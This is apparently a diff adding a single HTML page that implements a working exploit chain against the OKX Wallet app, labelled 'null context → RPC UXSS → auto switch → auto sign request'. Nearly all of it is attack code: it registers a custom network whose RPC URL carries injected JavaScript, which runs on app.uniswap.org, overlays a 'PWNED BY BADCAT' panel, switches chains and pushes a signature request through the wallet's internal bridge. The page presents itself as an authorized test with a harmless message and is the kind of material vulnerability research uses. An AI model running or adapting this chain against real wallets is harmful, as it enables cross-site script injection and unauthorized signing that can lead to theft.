@@ -1,0 +1,206 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta property="og:site_name" content="">
+<title>test</title>
+<style>
+  body { max-width: 780px; margin: 2rem auto; padding: 0 1rem; font: 16px/1.5 system-ui; }
+  button { width: 100%; padding: .9rem; font: inherit; font-weight: 700; }
+  button:disabled { opacity: .55; }
+  pre { white-space: pre-wrap; word-break: break-word; background: #f4f4f4; padding: 1rem; }
+  .warning { border-left: 4px solid #b00020; padding-left: 1rem; }
+</style>
+
+<h1>null context → RPC UXSS → auto switch → auto sign request</h1>
+
+
+<button id="run">RUN CONTROLLED CHAIN</button>
+<pre id="log"></pre>
+
+<script>
+const RPC_BASE = 'https://rpc.ankr.com/flare_coston2';
+const CUSTOM_CHAIN_ID = '0x72';
+const SWITCH_CHAIN_ID = '0x1';
+const EXPLORER = 'https://coston2-explorer.flare.network/';
+const DESTINATION = 'https://app.uniswap.org/';
+const TARGET_ORIGIN = new URL(DESTINATION).origin;
+
+const output = document.querySelector('#log');
+const runButton = document.querySelector('#run');
+const log = (...parts) => {
+  output.textContent += `[${new Date().toISOString()}] ${parts.join(' ')}\n`;
+};
+
+function provider() {
+  return [window.okxwallet, window.okxwallet?.ethereum, window.ethereum]
+    .find(candidate => candidate && typeof candidate.request === 'function');
+}
+
+function timeout(promise, label, milliseconds = 180000) {
+  return Promise.race([
+    promise,
+    new Promise((_, reject) => setTimeout(
+      () => reject(new Error(`${label} did not settle in ${milliseconds / 1000}s`)),
+      milliseconds
+    ))
+  ]);
+}
+
+function utf8Hex(value) {
+  return '0x' + [...new TextEncoder().encode(value)]
+    .map(byte => byte.toString(16).padStart(2, '0'))
+    .join('');
+}
+
+function payloadUrl() {
+  const fixedMessage = [
+    'OKX Wallet authorized UXSS context-isolation test.',
+    'No login, permit, token approval, transaction, or authorization.',
+    `Expected document origin: ${TARGET_ORIGIN}`,
+    `Expected active network: ${SWITCH_CHAIN_ID}`
+  ].join('\n');
+
+
+  const signBridgeMessage = JSON.stringify(JSON.stringify({
+    id: Date.now() + 1,
+    name: 'signPersonalMessage',
+    object: { data: utf8Hex(fixedMessage) }
+  }));
+
+  const marker =
+    `top===self&&location.origin===${JSON.stringify(TARGET_ORIGIN)}` +
+    `&&!window.__okxNullChainAutoLab` +
+    `&&(window.__okxNullChainAutoLab=1,(()=>{` +
+      `document.title='';` +
+      `alert(document.domain);` +
+      `const site=document.querySelector('meta[property="og:site_name"]');` +
+      `if(site)site.content='';` +
+      `const panel=document.createElement('div');` +
+      `panel.style='position:fixed;z-index:2147483647;inset:0;background:white;color:#111;padding:3rem;font:18px system-ui';` +
+      `const heading=document.createElement('h1');` +
+      `heading.textContent='PWNED BY BADCAT';` +
+      `const status=document.createElement('pre');` +
+      `status.style='white-space:pre-wrap;word-break:break-word;background:#f4f4f4;padding:1rem';` +
+      `status.textContent='UXSS=EXECUTED\\norigin='+location.origin+'\\ntopLevel='+(top===self)+'\\ntitleLength='+document.title.length+'\\nstatus=WAITING_FOR_BRIDGES';` +
+      `const warning=document.createElement('p');` +
+      `warning.style='color:#b00020;font-weight:700';` +
+      `warning.textContent='REJECT THE SIGNATURE PROMPT. No signature is retained or transmitted.';` +
+      `panel.append(heading,warning,status);` +
+      `document.documentElement.appendChild(panel);` +
+      `let attempts=0;` +
+      `const findProvider=()=>[window.okxwallet,window.okxwallet?.ethereum,window.ethereum].find(x=>x&&typeof x.request==='function');` +
+      `const boot=()=>{` +
+        `const p=findProvider();` +
+        `const b=window.okxInternalJSBridge;` +
+        `if(!p||!b||typeof b.postMessage!=='function'){` +
+          `if(++attempts<80){setTimeout(boot,250);return}` +
+          `status.textContent+='\\nstatus=BRIDGE_NOT_FOUND_AFTER_20_SECONDS';return` +
+        `}` +
+        `status.textContent+='\\nstatus=PROVIDER_AND_NATIVE_BRIDGE_READY';` +
+        `(async()=>{` +
+          `try{` +
+            `const before=await p.request({method:'eth_chainId',params:[]});` +
+            `status.textContent+='\\nchainBefore='+before+'\\nautoSwitch=REQUESTED:${SWITCH_CHAIN_ID}';` +
+            `await p.request({method:'wallet_switchEthereumChain',params:[{chainId:${JSON.stringify(SWITCH_CHAIN_ID)}}]});` +
+            `const after=await p.request({method:'eth_chainId',params:[]});` +
+            `status.textContent+='\\nchainAfter='+after;` +
+            `if(String(after).toLowerCase()!==${JSON.stringify(SWITCH_CHAIN_ID)})throw Error('SWITCH_NOT_COMMITTED');` +
+            `status.textContent+='\\nautoSwitch=SUCCESS\\nautoSign=QUEUED';` +
+            `setTimeout(()=>{` +
+              `try{` +
+                `b.postMessage(${signBridgeMessage});` +
+                `status.textContent+='\\nautoSign=DISPATCHED\\nexpected=APPROVAL_REQUIRED';` +
+              `}catch(e){status.textContent+='\\nautoSign=POST_ERROR:'+(e?.message||String(e))}` +
+            `},700);` +
+          `}catch(e){status.textContent+='\\nchainResult=ERROR:'+(e?.message||String(e))}` +
+        `})();` +
+      `};` +
+      `setTimeout(boot,400)` +
+    `})())`;
+
+  // The fragment is not sent to the RPC endpoint. This APK stores the raw
+  // value and later concatenates it into a double-quoted JavaScript literal.
+  return `${RPC_BASE}#null_chain_lab=testestetete"+(${marker},"")+"`;
+}
+
+async function run() {
+  if (location.protocol !== 'https:') throw new Error('Host this page over HTTPS');
+  if (top !== self) throw new Error('Open this page top-level, not in an iframe');
+
+  const wallet = provider();
+  if (!wallet) throw new Error('Injected OKX EVM provider was not found');
+
+  log('titleLength=', document.title.length);
+  log('target=', TARGET_ORIGIN);
+  log('1/5 Connect initial lab page; approve this dialog.');
+  const accounts = await timeout(wallet.request({
+    method: 'eth_requestAccounts',
+    params: []
+  }), 'eth_requestAccounts');
+  if (!Array.isArray(accounts) || !accounts.length) {
+    throw new Error('Connection returned no EVM account');
+  }
+  log('PASS connect; accountCount=', accounts.length, '(address omitted)');
+
+  const rpcUrl = payloadUrl();
+  log('2/5 Probe RPC endpoint.');
+  const response = await timeout(fetch(rpcUrl, {
+    method: 'POST',
+    headers: { 'content-type': 'application/json' },
+    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'eth_chainId', params: [] })
+  }), 'RPC probe', 30000);
+  const body = await response.json();
+  if (!response.ok || String(body.result).toLowerCase() !== CUSTOM_CHAIN_ID) {
+    throw new Error(`RPC mismatch: HTTP ${response.status}, result ${body.result}`);
+  }
+  log('PASS probe=', body.result);
+
+  log('3/5 Add custom network; inspect and approve the native dialog.');
+  await timeout(wallet.request({
+    method: 'wallet_addEthereumChain',
+    params: [{
+      chainId: CUSTOM_CHAIN_ID,
+      chainName: 'Null Context UXSS Lab',
+      nativeCurrency: { name: 'Coston2 Flare', symbol: 'C2FLR', decimals: 18 },
+      rpcUrls: [rpcUrl],
+      blockExplorerUrls: [EXPLORER]
+    }]
+  }), 'wallet_addEthereumChain');
+  log('PASS add; raw RPC payload stored.');
+
+  log('4/5 Select stored custom chain. No switch approval is expected.');
+  await timeout(wallet.request({
+    method: 'wallet_switchEthereumChain',
+    params: [{ chainId: CUSTOM_CHAIN_ID }]
+  }), 'wallet_switchEthereumChain');
+  const active = await timeout(wallet.request({ method: 'eth_chainId', params: [] }), 'eth_chainId');
+  if (String(active).toLowerCase() !== CUSTOM_CHAIN_ID) {
+    throw new Error(`Expected ${CUSTOM_CHAIN_ID}, received ${active}`);
+  }
+  log('PASS custom chain active=', active);
+
+  log('5/5 Navigate to', DESTINATION);
+  log('Payload will auto-switch to 0x1 and automatically open one sign prompt. REJECT it.');
+  setTimeout(() => location.assign(DESTINATION), 700);
+}
+
+runButton.onclick = async () => {
+  runButton.disabled = true;
+  output.textContent = '';
+  try {
+    await run();
+  } catch (error) {
+    log('ERROR=', error?.stack || error?.message || String(error));
+    runButton.disabled = false;
+  }
+};
+
+try {
+  const generated = `window.okxwallet.setConfig({chainId:114,address:"",rpcUrl:"${payloadUrl()}"})`;
+  new Function(generated);
+  document.documentElement.dataset.sinkTemplateSyntax = 'pass';
+} catch (error) {
+  document.documentElement.dataset.sinkTemplateSyntax = 'fail';
+  log('LOCAL TEMPLATE CHECK ERROR=', error?.message || String(error));
+}
+</script>
